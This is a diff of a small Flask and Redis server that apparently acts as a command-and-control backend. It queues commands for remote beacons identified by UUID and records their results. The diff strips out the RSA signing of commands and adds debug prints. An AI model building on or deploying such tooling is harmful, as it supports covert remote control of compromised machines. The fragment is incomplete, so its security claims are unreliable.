@@ -6,25 +6,16 @@
 # so use postgresql to create a series of tables in a db
 # the flask webserver sees the UUID then performs a fetch from the db
 # e z p z
-import base64
+
 from datetime import datetime
 from flask import *
 import json
 import redis
 import string
-from cryptography.hazmat.primitives.asymmetric import rsa
-from cryptography.hazmat.primitives import serialization
-from cryptography.hazmat.primitives.asymmetric import padding
-from cryptography.hazmat.primitives import hashes
-import sys
-import binascii
 
 conn = redis.StrictRedis(host='localhost', port=6379, db=0)
 app = Flask(__name__)
 
-
-# Test formatting the key for storage
-#print(base64.b64decode(encoded_key)) # and this gives us back the key warts and all
 
 @app.route('/', methods=['GET'])
 def home():
@@ -40,23 +31,6 @@ def home():
             # If we receive special characters just drop it entirely
             pass
         else:
-            private_key = rsa.generate_private_key(
-                public_exponent=65537,
-                key_size=2048,
-            )
-            print('made key')
-            pem_public_key = private_key.public_key().public_bytes(
-                encoding=serialization.Encoding.PEM,
-                format=serialization.PublicFormat.SubjectPublicKeyInfo
-            )
-            pem = private_key.private_bytes(
-                encoding=serialization.Encoding.PEM,
-                format=serialization.PrivateFormat.TraditionalOpenSSL,
-                encryption_algorithm=serialization.NoEncryption()
-            )
-            print('test')
-            with open('keys/'+uuid+".pem", "wb") as key_file: # Write the key value to the pem
-                key_file.write(pem)
             structure = {
                 "WhoAmI": f"{whoami}",
                 "Signature": "0",
@@ -93,15 +67,8 @@ def session():
             LastInteraction = connector["LastInteraction"]
             result = connector["Result"]
             whoami = connector["WhoAmI"]
-
-            command1 = bytes(command, 'utf-8') # To sign the command, it requires a bytes like object
-
-            with open('keys/'+uuid + ".pem", "rb") as key_file: # Read in the pem file for the UUID
-                private_key = serialization.load_pem_private_key(key_file.read(), password=None)
-
-            signature = private_key.sign(command1, padding.PSS(mgf=padding.MGF1(hashes.SHA256()),
-                                                              salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256())
-            signature = binascii.b2a_hex(signature).decode()
+            signature = connector["Signature"]
+            print(signature)
             # Set the command to 0
             structure = {
                 "WhoAmI": f"{whoami}",
@@ -116,10 +83,11 @@ def session():
             structure = json.dumps(structure)  # Dump the json
             # Write the message value to the beacon:UUID key
             conn.hset('UUID', uuid, structure)
-            signature = str(signature)
+            #signature = str(signature)
             resp = Response(
                 response=command, status=302, mimetype="text/plain")
             resp.headers['Verifier'] = signature
+            print(signature)
             return resp  # we've really got to RC4 encrypt this
 
 
